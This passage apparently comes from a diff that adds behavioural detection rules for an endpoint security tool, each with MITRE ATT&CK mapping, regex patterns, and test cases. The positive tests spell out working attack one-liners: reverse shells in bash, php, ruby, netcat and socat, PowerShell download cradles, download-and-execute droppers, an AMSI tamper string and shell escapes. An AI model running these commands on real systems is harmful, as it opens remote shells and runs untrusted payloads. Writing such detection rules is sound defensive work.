+   "tactic": "Execution",
+   "technique": "T1059",
+   "technique_name": "Command and Scripting Interpreter",
+   "severity": "critical",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "ruby[\\d.]*$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(socket|TCPSocket).*(exec|spawn|popen)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "reverse-shell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/ruby",
+      "command": "ruby -rsocket -e TCPSocket.open('203.0.113.9',4444);exec '/bin/sh'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ruby",
+      "command": "ruby -e puts 1"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-php-r-socket-exec",
+   "name": "php -r socket reverse shell",
+   "description": "php -r with fsockopen or socket calls followed by exec, proc_open or system is a reverse shell one-liner.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "technique_name": "Command and Scripting Interpreter",
+   "severity": "critical",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "php[\\d.]*(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-r\\s.*(fsockopen|socket_create|stream_socket_client).*(exec|proc_open|shell_exec|passthru|system)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "reverse-shell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/php",
+      "command": "php -r $s=fsockopen('203.0.113.9',4444);exec('/bin/sh -i <&3');"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/php",
+      "command": "php -r echo phpversion();"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-bash-dev-tcp-redirect",
+   "name": "bash /dev/tcp reverse redirection",
+   "description": "bash -i with stdin and stdout redirected to /dev/tcp is a pure-shell reverse shell.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "critical",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(bash|sh)\\s+-i\\s*>?&?\\s*.*/dev/(tcp|udp)/|/dev/tcp/\\S+\\s*0>&1|exec\\s+\\d<>/dev/tcp/"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "reverse-shell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
+     },
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c exec 5<>/dev/tcp/203.0.113.9/80"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -i"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-mkfifo-nc-reverse-shell",
+   "name": "mkfifo and netcat shell loop",
+   "description": "A fifo combined with nc into sh -i is the traditional pipe-based reverse shell for netcats without -e.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "critical",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "mkfifo\\s+\\S+.*(nc|ncat|netcat)\\s.*\\|\\s*(sh|bash)|/bin/sh\\s+-i\\s+2>&1\\s*\\|\\s*nc"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "reverse-shell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/mkfifo",
+      "command": "mkfifo /tmp/mypipe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-nc-exec-flag",
+   "name": "netcat with -e or -c exec",
+   "description": "nc or ncat given -e or -c to attach a shell to a socket is a bind or reverse shell, not routine usage.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(nc|ncat|netcat|nc\\.traditional)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-(e|c)\\s+\\S*(sh|bash|cmd)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "netcat"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/ncat",
+      "command": "ncat 203.0.113.9 4444 -e /bin/bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/nc",
+      "command": "nc -zv 10.0.0.5 22"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-socat-exec-tcp",
+   "name": "socat exec shell over TCP",
+   "description": "socat with EXEC or SYSTEM of a shell and a TCP address provides a shell channel.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "critical",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/socat$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(exec|system):\\S*(sh|bash)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "reverse-shell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/socat",
+      "command": "socat TCP:203.0.113.9:4444 EXEC:/bin/bash,pty"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/socat",
+      "command": "socat TCP-LISTEN:8080,fork TCP:localhost:80"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-powershell-download-cradle-iex",
+   "name": "PowerShell download cradle with IEX",
+   "description": "PowerShell fetching remote content and piping it to Invoke-Expression runs a payload without writing a file.",
+   "tactic": "Execution",
+   "technique": "T1059.001",
+   "technique_name": "PowerShell",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "((downloadstring|downloadfile|iwr|invoke-webrequest|irm|webclient).*(iex|invoke-expression)|(iex|invoke-expression).*(downloadstring|iwr|invoke-webrequest|irm|webclient))"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "powershell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://x/a')"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell iwr http://x/a | iex"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Invoke-WebRequest https://x/a -OutFile a.zip"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-powershell-encoded-hidden",
+   "name": "PowerShell hidden window with encoded command",
+   "description": "Non-interactive, hidden-window PowerShell carrying a long encoded command is a classic malware launcher.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027.010",
+   "technique_name": "Command Obfuscation",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-w(indowstyle)?\\s+hidden|-nop|-noprofile).*(-enc|-e|-encodedcommand)\\s+[A-Za-z0-9+/=]{20,}"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "powershell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -NoProfile -File build.ps1"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-powershell-amsi-tamper-text",
+   "name": "PowerShell AMSI or logging tamper strings",
+   "description": "Command lines naming amsiInitFailed, AmsiUtils or script-block-logging disablement show defense tampering inside PowerShell.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Disable or Modify Tools",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(amsiinitfailed|amsiutils|amsicontext)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "amsi"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-Process"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-cmd-chained-download-execute",
+   "name": "cmd chained download then run",
+   "description": "One cmd line chaining a downloader with a launch of the downloaded file stages and detonates a payload.",
+   "tactic": "Execution",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "cmd\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(certutil.*-urlcache|bitsadmin.*/transfer|curl.*-o|powershell.*downloadfile).*(&&|&|;)\\s*(start\\s+)?\\S+\\.(exe|bat|dll|ps1|vbs)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lolbin"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c certutil -urlcache -f http://x/a.exe a.exe && a.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c dir && echo done"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-download-chmod-exec-one-line",
+   "name": "Download, chmod and run in one command line",
+   "description": "A single line that fetches a file, sets the execute bit and runs it is automated payload staging.",
+   "tactic": "Execution",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(curl|wget|fetch)\\b.*(&&|;)\\s*chmod\\s+(\\+x|[0-7]*7[0-7]*)\\s+\\S+\\s*(&&|;)\\s*(\\./|/)\\S+"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "staging"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c wget http://203.0.113.9/a -O /tmp/a && chmod +x /tmp/a && /tmp/a"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c curl -o /dev/shm/.x http://h/x; chmod 755 /dev/shm/.x; /dev/shm/.x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c curl -o a.tgz https://x/a.tgz && tar xf a.tgz"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-download-chmod-exec-macos",
+   "name": "macOS curl, quarantine strip and execute",
+   "description": "curl, chmod +x or xattr strip and launch in one line on macOS is infostealer staging.",
+   "tactic": "Execution",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(curl|wget).*(chmod\\s+\\+x|xattr\\s+-(c|d|cr)).*(&&|;)\\s*(\\./|/)\\S+"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "staging"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/zsh",
+      "command": "zsh -c curl -o /tmp/u http://h/u && xattr -c /tmp/u && chmod +x /tmp/u && /tmp/u"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/zsh",
+      "command": "zsh -c curl -O https://h/a.dmg && open a.dmg"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-wget-quiet-tmp-exec",
+   "name": "wget to temp dir then execute",
+   "description": "A quiet wget writing into /tmp or /dev/shm and executing it in the same line is dropper behaviour.",
+   "tactic": "Execution",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "wget\\s+(-q\\w*\\s+)*\\S*\\s*-O\\s*(/tmp|/var/tmp|/dev/shm)/\\S+.*(;|&&|\\|\\|)\\s*(sh|bash|\\./|/tmp|/var/tmp|/dev/shm)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "staging"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c wget -q http://h/a -O /tmp/.a; sh /tmp/.a"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c wget -q https://h/a -O /tmp/a.html"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-curl-pipe-shell-raw-ip",
+   "name": "curl or wget piped to shell from raw IP",
+   "description": "Fetching a script from a bare IP address and piping into a shell avoids named infrastructure and runs unreviewed code.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(curl|wget)\\b[^|]*https?://\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}[^|]*\\|\\s*(sudo\\s+)?(sh|bash|zsh|python[\\d.]*)\\b"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "staging"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c curl -s http://203.0.113.9/i.sh | bash"
+     },
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c wget -qO- http://198.51.100.2:8080/x | sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c curl -s https://get.docker.com | sh"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-curl-pipe-shell-paste-host",
+   "name": "curl or wget piped to shell from paste or tunnel host",
+   "description": "Pulling script content from paste, transfer or tunnelling hosts into a shell avoids owned infrastructure.",
+   "tactic": "Execution",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(curl|wget)\\b[^|]*(pastebin\\.com|paste\\.ee|transfer\\.sh|ix\\.io|0x0\\.st|ngrok|trycloudflare)[^|]*\\|\\s*(sh|bash|python[\\d.]*)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "staging"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c curl https://pastebin.com/raw/AbC | sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c curl https://pastebin.com/raw/AbC -o note.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-tftp-fetch-chmod-exec",
+   "name": "tftp or ftpget fetch then run",
+   "description": "A tftp or ftpget fetch followed by chmod and run in a single line is embedded-device malware staging.",
+   "tactic": "Execution",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(tftp|ftpget|busybox\\s+wget)\\b.*(;|&&)\\s*chmod\\s+\\S+\\s+\\S+\\s*(;|&&)\\s*\\./?\\S+"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "iot"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c tftp -g -r bot 203.0.113.9; chmod 777 bot; ./bot"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c tftp -g -r fw.bin 10.0.0.1"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-exec-from-devshm",
+   "name": "Process executed from shared-memory directory",
+   "description": "Binaries running from /dev/shm are almost always staged malware since nothing legitimate installs there.",
+   "tactic": "Defense Evasion",
+   "technique": "T1036",
+   "technique_name": "Masquerading",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "^/(dev/shm|run/shm|var/run/shm)/"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "writable-dir"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/dev/shm/.x",
+      "command": "/dev/shm/.x -c"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/vim",
+      "command": "vim /dev/shm/notes.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-exec-tmp-with-network-flags",
+   "name": "Temp-dir binary with network arguments",
+   "description": "An executable in a temp directory carrying host, port, pool or URL flags is a staged implant or miner talking out.",
+   "tactic": "Command and Control",
+   "technique": "T1071",
+   "technique_name": "Application Layer Protocol",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "^(/tmp/|/var/tmp/|/dev/shm/|/private/tmp/|/private/var/tmp/|/run/user/\\d+/|/var/run/shm/)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-(o|-url|-pool|-host|-h|-s)\\s+\\S*(:\\d{2,5}|\\d+\\.\\d+\\.\\d+\\.\\d+)|--server|--connect|stratum\\+|https?://)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "writable-dir"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/.kworker",
+      "command": "/tmp/.kworker -o 203.0.113.9:3333 -u w"
+     },
+     {
+      "executable": "/private/tmp/agent",
+      "command": "/private/tmp/agent --server http://h/c2"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/tmp/build/test",
+      "command": "/tmp/build/test --verbose"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-exec-hidden-file-in-tmp",
+   "name": "Hidden dotfile executed from temp dir",
+   "description": "A dot-prefixed executable in a temp dir hides in directory listings and is a drop-and-run marker.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hidden Files and Directories",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "^(/tmp/|/var/tmp/|/dev/shm/|/private/tmp/|/private/var/tmp/|/run/user/\\d+/|/var/run/shm/)([^/]+/)*\\.[^/]+$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "writable-dir"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/.ICE-unix/.x",
+      "command": "/tmp/.ICE-unix/.x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/tmp/run/app",
+      "command": "/tmp/run/app"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-shell-child-of-downloads-binary",
+   "name": "Shell spawned by an app in Downloads or Desktop",
+   "description": "A shell or curl child whose parent lives in a Downloads or Desktop folder indicates a freshly downloaded app launching a stage.",
+   "tactic": "Execution",
+   "technique": "T1204.002",
+   "technique_name": "User Execution: Malicious File",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](Downloads|Desktop)[/\\\\]"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](sh|bash|zsh|cmd|powershell|osascript|curl)(\\.exe)?$"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "user-writable"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c id",
+      "parent_exe": "/Users/ann/Downloads/Installer"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c id",
+      "parent_exe": "/usr/sbin/sshd"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-exec-from-appdata-with-network-args",
+   "name": "Windows user-dir executable with network arguments",
+   "description": "Executables in TEMP, AppData Roaming, Public or ProgramData started with URL or host arguments suggest dropped tools.",
+   "tactic": "Command and Control",
+   "technique": "T1071",
+   "technique_name": "Application Layer Protocol",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "^[a-z]:\\\\(users\\\\[^\\\\]+\\\\appdata\\\\(local\\\\temp|roaming)|users\\\\public|programdata|windows\\\\temp)\\\\"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(https?://|\\s-(o|u|p|-url)\\s|\\d+\\.\\d+\\.\\d+\\.\\d+)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "user-writable"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Local\\Temp\\a.exe",
+      "command": "a.exe http://198.51.100.1/c"
+     },
+     {
+      "executable": "C:\\Users\\Public\\x.exe",
+      "command": "x.exe -o 203.0.113.9:80"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Local\\Temp\\setup.exe",
+      "command": "setup.exe /S"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-exec-from-recycle-bin-or-perflogs",
+   "name": "Execution from Recycle Bin or PerfLogs",
+   "description": "Programs started from the Recycle Bin or PerfLogs are staging locations used to avoid normal install paths.",
+   "tactic": "Defense Evasion",
+   "technique": "T1036.005",
+   "technique_name": "Match Legitimate Name or Location",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "\\\\(\\$recycle\\.bin|perflogs)\\\\"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "writable-dir"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\$Recycle.Bin\\S-1-5-21\\x.exe",
+      "command": "x.exe"
+     },
+     {
+      "executable": "C:\\PerfLogs\\a.exe",
+      "command": "a.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-interpreter-tmp-script-with-url",
+   "name": "Interpreter running temp-dir script that fetches a URL",
+   "description": "python, perl or bash running a script in a temp dir that also takes a URL or IP is typical stager behaviour.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "technique_name": "Command and Scripting Interpreter",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(python[\\d.]*|perl|ruby|bash|sh|node)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(/tmp/|/var/tmp/|/dev/shm/|/private/tmp/|/private/var/tmp/|/run/user/\\d+/|/var/run/shm/)\\S+\\.(py|pl|rb|sh|js)\\b.*(https?://|\\d+\\.\\d+\\.\\d+\\.\\d+)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "writable-dir"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 /tmp/up.py http://203.0.113.9/x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 /tmp/test.py --unit"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-masquerade-system-name-in-tmp",
+   "name": "System process name running from a temp dir",
+   "description": "sshd, systemd, kworker, cron or similar names executing out of a temp directory is masquerading.",
+   "tactic": "Defense Evasion",
+   "technique": "T1036.005",
+   "technique_name": "Match Legitimate Name or Location",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "^(/tmp/|/var/tmp/|/dev/shm/|/private/tmp/|/private/var/tmp/|/run/user/\\d+/|/var/run/shm/)([^/]+/)*(sshd|systemd[^/]*|kworker[^/]*|cron|crond|syslogd|dbus-daemon|udevd|init)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "masquerade"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/systemd-private/sshd",
+      "command": "/tmp/systemd-private/sshd -D"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/sshd",
+      "command": "/usr/sbin/sshd -D"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-core-windows-process-wrong-path",
+   "name": "Core Windows process outside System32",
+   "description": "svchost, lsass, csrss, winlogon or similar names running from non-System32 locations is masquerading.",
+   "tactic": "Defense Evasion",
+   "technique": "T1036.005",
+   "technique_name": "Match Legitimate Name or Location",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(svchost|lsass|csrss|smss|winlogon|services|wininit)\\.exe$"
+     },
+     {
+      "not": {
+       "field": "executable",
+       "op": "regex",
+       "pattern": "^[a-z]:\\\\windows\\\\(system32|syswow64)\\\\"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "masquerade"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\ann\\AppData\\Local\\Temp\\svchost.exe",
+      "command": "svchost.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\svchost.exe",
+      "command": "svchost.exe -k netsvcs"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-gtfobins-find-exec-shell",
+   "name": "find -exec spawns shell",
+   "description": "find with -exec to a shell is a classic privilege-escalation or restricted-shell escape.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/find$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-exec\\s+\\S*(sh|bash|dash)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "gtfobins"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/find",
+      "command": "find . -exec /bin/sh -p ; -quit"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/find",
+      "command": "find . -name *.go -exec grep -l main {} ;"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-gtfobins-awk-system-shell",
+   "name": "awk system() shell escape",
+   "description": "awk BEGIN with system(/bin/sh) is a known shell breakout.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(g|m)?awk$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "system\\s*\\(\\s*[\\\"']?/?(bin/)?(sh|bash)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "gtfobins"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/awk",
+      "command": "awk BEGIN {system(\"/bin/sh\")}"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/awk",
+      "command": "awk {print $1} data.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-gtfobins-editor-shell-escape",
+   "name": "vim or less shell escape on the command line",
+   "description": "vim -c with a shell bang or python os.execl spawns a shell from an editor, often under sudo.",
